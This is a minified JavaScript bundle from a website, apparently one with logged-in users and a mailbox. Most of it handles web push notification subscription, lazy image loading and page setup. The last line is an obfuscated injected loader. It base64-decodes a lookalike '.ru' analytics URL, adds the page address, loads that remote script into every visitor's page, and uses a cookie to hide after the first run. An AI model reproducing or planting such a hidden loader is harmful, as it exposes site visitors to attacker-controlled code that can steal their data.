e?e.pushManager.getSubscription().then((function(a){t(a?{permission:"granted",supported:1,message:"ServiceWorker PushManager Subscription Success",subscription:a,registration:e}:{permission:"pending",supported:1,message:"ServiceWorker PushManager Subscription Not Found"})})):t({permission:!1,supported:0,message:"ServiceWorker PushManager Not Supported"}):t({permission:"default",supported:1,message:"ServiceWorker No Registration Found"})})):(t({permission:!1,supported:0,message:"ServiceWorker showNotification Not Supported"}),!1):(t({permission:!1,supported:0,message:"ServiceWorker PushManager Not Supported"}),!1):(t({permission:!1,supported:0,message:"ServiceWorker Not Supported"}),!1)},getSubscriptionPayload:function(e){var t=e.endpoint,a=e.subscriptionId;a&&-1===t.indexOf(a)&&(t+="/"+a);var i=e.getKey("p256dh"),o=e.getKey("auth");return{endpoint:t,key:i?btoa(String.fromCharCode.apply(null,new Uint8Array(i))):"",token:o?btoa(String.fromCharCode.apply(null,new Uint8Array(o))):""}},unsubscribe:function(e,t){return console.log("unsubscribe"),"serviceWorker"in navigator?"PushManager"in window?(navigator.serviceWorker.ready.then((function(a){console.log("1",a),"pushManager"in a?a.pushManager.getSubscription().then((function(a){if(console.log("2",a),!a)return t({message:"No subscription found."}),void console.log("not found");if("unsubscribe"in a){var i=a.getKey("p256dh"),o=a.getKey("auth"),n={key:i?btoa(String.fromCharCode.apply(null,new Uint8Array(i))):"",token:o?btoa(String.fromCharCode.apply(null,new Uint8Array(o))):""};e({payload:n,callback:function(e,t){console.log(e,t),a.unsubscribe().then((function(t){"function"==typeof e&&e(t)})).catch((function(e){"function"==typeof t&&t({message:"subscription.unsubscribe() Failed to Unsubscribe",e:e})}))}})}else console.log("not supported unsubscribe")})).catch((function(e){console.log("pushManager.getSubscription() Failed to Unsubscribe"),t({message:"pushManager.getSubscription() Failed to Unsubscribe",e:e})})):console.log("not in registration")})),void console.log("end")):(console.log("not pish not in window"),!1):(console.log("not supported"),!1)},unregister:function(e,t){if(!("serviceWorker"in navigator))return e({result:!0}),!1;navigator.serviceWorker.ready.then((function(a){a?"unregister"in a?a.unregister().then((function(t){e({result:t})})):t({message:"Unregister not available on ServiceWorker Registration - Check your browser settings!"}):e({result:!0})}))},init:function(e){var t={vapidPublicKey:null,scriptURL:null,callback:null};return"function"==typeof(t=$.extend({},t,e)).callback&&("serviceWorker"in navigator?"PushManager"in window?"showNotification"in ServiceWorkerRegistration.prototype?"denied"===Notification.permission?(t.callback({permission:"denied",supported:1,message:"ServiceWorker Notification Permission Denied - Check your browser settings!"}),!1):void navigator.serviceWorker.register(t.scriptURL).then((function(e){"update"in e&&e.update(),"pushManager"in e?e.pushManager.getSubscription().then((function(a){if(a)return t.callback({permission:"granted",supported:1,save:1,payload:wp.sw.getSubscriptionPayload(a)}),a;const i=wp.urlBase64ToUint8Array(t.vapidPublicKey);e.pushManager.subscribe({userVisibleOnly:!0,applicationServerKey:i}).then((function(e){t.callback({permission:"granted",supported:1,save:1,payload:wp.sw.getSubscriptionPayload(e)})})).catch((function(e){"denied"===Notification.permission?t.callback({permission:"denied",supported:1,message:"PushManager subscription failed - Notification Permission Denied",e:e}):t.callback({permission:"default",supported:1,message:"PushManager subscription failed",e:e})}))})).catch((function(e){t.callback({permission:"default",supported:1,message:"PushManager getSubscription() Error",e:e})})):t.callback({permission:!1,supported:0,message:"ServiceWorker PushManager Not Supported"})})).catch((function(e){t.callback({permission:"default",supported:1,message:"ServiceWorker Error Registering",e:e})})):(t.callback({permission:!1,supported:0,message:"ServiceWorker showNotification Not Supported"}),!1):(t.callback({permission:!1,supported:0,message:"ServiceWorker PushManager Not Supported"}),!1):(t.callback({permission:!1,supported:0,message:"ServiceWorker Not Supported"}),!1))}},init:function(e){getLocalStorageCache("webPushInit")||wp.getConfig((function(){wp.checkPermissions((function(){var t=wp.getPushType();"function"==typeof e&&e(t)}))}))},getConfig:function(e){wp.config?"function"==typeof e&&e(wp.config):$.ajax({type:"post",url:"/notifications/push/config",success:function(t){var a=JSON.parse(t);wp.config=a,"function"==typeof e&&e(a)}})},checkPermissions:function(e){if(!wp.config)return!1;var t=0;wp.notify.checkPermission((function(a){wp.notify.permission=a,"function"==typeof e&&3==++t&&e()})),wp.apns.checkPermission(wp.config.apns_push_id,(function(a){wp.apns.permission=a.permission,"function"==typeof e&&3==++t&&e()})),wp.sw.checkPermission(wp.config.sw_scope,(function(a){wp.sw.available=1==a.supported,wp.sw.permission=a.permission,"function"==typeof e&&3==++t&&e()}))},getPushType:function(){return!!wp.config&&(wp.apns.available?{type:"apns",permission:wp.apns.permission,update:"granted"==wp.apns.permission?1:0,popup:"denied"!=wp.apns.permission&&"granted"!=wp.apns.permission?1:0}:wp.sw.available?{type:"sw",permission:wp.sw.permission,update:"granted"==wp.sw.permission?1:0,popup:"denied"!=wp.sw.permission&&"granted"!=wp.sw.permission?1:0}:!!wp.notify.available&&{type:"notify",permission:wp.notify.permission,update:"granted"==wp.notify.permission?1:0,popup:"denied"!=wp.notify.permission&&"granted"!=wp.notify.permission?1:0})},registerPush:function(){var e=wp.getPushType();if(!1!==e)switch(e.type){case"apns":wp.registerAPNSWebPush();break;case"sw":wp.registerServiceWorker();break;case"notify":wp.registerBasicNotification()}},registerBasicNotification:function(e){if(!wp.config)return!1;wp.notify.init((function(t){wp.notify.permission=t,!1!==t&&"denied"!==t&&e&&wp.notify.show({title:"Registration Successful!",text:"Registration for browser notifications was successful!",icon:wp.config.sw_icon_url})}))},registerAPNSWebPush:function(){if(!wp.config)return!1;wp.apns.init({pushID:wp.config.apns_push_id,restApi:wp.config.apns_rest_api,callback:function(e){wp.apns.permission=e.permission,e.deviceToken&&$.ajax({type:"post",url:"/notifications/apns/v2/devices/",data:{pushID:wp.config.apns_push_id,deviceToken:e.deviceToken},success:e=>{if(1==JSON.parse(e).success){var t=wp.getPushType();"granted"==t.permission&&(setLocalStorageCache("webPushInit",JSON.stringify(t),wp.config.request_popup_time),$("#dashNotificationSwitch").removeClass("switchOff"))}}})}})},registerServiceWorker:function(){if(!wp.config)return!1;wp.sw.init({vapidPublicKey:wp.config.vapid_public_key,scriptURL:wp.config.sw_script_url,callback:function(e){console.log("permData",e),wp.sw.available=1==e.supported,wp.sw.permission=e.permission,wp.sw.message=e.message?e.message:null,e.payload&&1==e.save&&$.ajax({type:"post",url:"/notifications/sw/save",data:e.payload,success:e=>{var t=wp.getPushType();"granted"==t.permission&&(setLocalStorageCache("webPushInit",JSON.stringify(t),wp.config.request_popup_time),$("#dashNotificationSwitch").removeClass("switchOff"))}})}})},checkActive:function(){return new Promise((function(e){wp.getConfig((function(){wp.checkPermissions((function(){var t=wp.getPushType();e(t)}))}))}))},activate:function(){wp.init((function(e){if(!1!==e){var t=wp.getPushType();return setLocalStorageCache("webPushInit",JSON.stringify(t),wp.config.request_popup_time),wp.registerPush(),!0}return!1}))}};function closeNotificationPopUp(){var e=wp.getPushType();setLocalStorageCache("webPushInit",JSON.stringify(e),wp.config.request_popup_time),$("#notification-popup-js").addClass("invisible")}function notificationInit(){isLogged&&(0==$("#confirm, #alert").length?wp.init((function(e){if(!1!==e&&(1==e.popup&&$("#notification-popup-js").removeClass("invisible"),1==e.update)){var t=wp.getPushType();setLocalStorageCache("webPushInit",JSON.stringify(t),wp.config.request_popup_time),wp.registerPush()}})):setTimeout((function(){notificationInit()}),3e4))}var diferLoading={imgClass:"difer-image-js",init:function(e){if(window.pageYOffset>5)diferLoading.show();else{if(e){var t=document.getElementById(e);if(!t)return;var a=Array.from(t.children);if(!a)return;var i=t.getBoundingClientRect().top,o=Math.round(t.offsetWidth/a[0].offsetWidth),n=Math.round((window.innerHeight-i)/a[0].offsetHeight),s=Array.from(document.querySelectorAll("#"+e+" ."+diferLoading.imgClass+"[data-src]"));if(!s)return;for(var r=0;r<o*n;r++)diferLoading.handle(s[r])}setTimeout((function(){window.addEventListener("scroll",diferLoading.show,!0),window.addEventListener("resize",diferLoading.show,!0)}),200)}},show:function(e){Array.from(document.getElementsByClassName(diferLoading.imgClass)).forEach((function(e){diferLoading.handle(e)})),window.removeEventListener("scroll",diferLoading.show,!0),window.removeEventListener("resize",diferLoading.show,!0)},handle:function(e){e&&(e.src?e.src=e.getAttribute("data-src"):e.style.backgroundImage="url("+e.getAttribute("data-src")+")")}};$(document).ready((function(){loadChosen(),initScripts(),loadTopLocations(),$(".menuIconContainer").click((function(){$(".mobile-navigation").toggleClass("active")})),$(".close-nav-li-mobile").click((function(){$(".mobile-navigation").removeClass("active")})),$(".menuIconContainerDesktop").click((function(){$(".mobile-navigation").toggleClass("active")})),isLogged&&(keeponline(),keeponlineInterval=setInterval((function(){keeponline()}),6e4),setTimeout((function(){notificationInit()}),3e4),"homePage"==pageName&&-1!==window.location.search.indexOf("push=clicked")&&(window.location="/mailbox"))}));!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);